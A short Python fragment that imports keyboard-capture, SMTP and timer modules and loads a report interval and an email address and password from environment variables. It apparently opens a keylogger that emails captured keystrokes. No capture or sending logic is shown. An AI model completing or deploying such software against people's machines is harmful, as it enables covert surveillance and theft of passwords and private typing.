import keyboard
import smtplib
from threading import Timer

import os
from dotenv import load_dotenv

load_dotenv()

SEND_REPORT_EVERY = os.getenv('SEND_REPORT_EVERY')
EMAIL_ADDRESS = os.getenv('EMAIL_ADDRESS')
EMAIL_PASSWORD = os.getenv('EMAIL_PASSWORD')

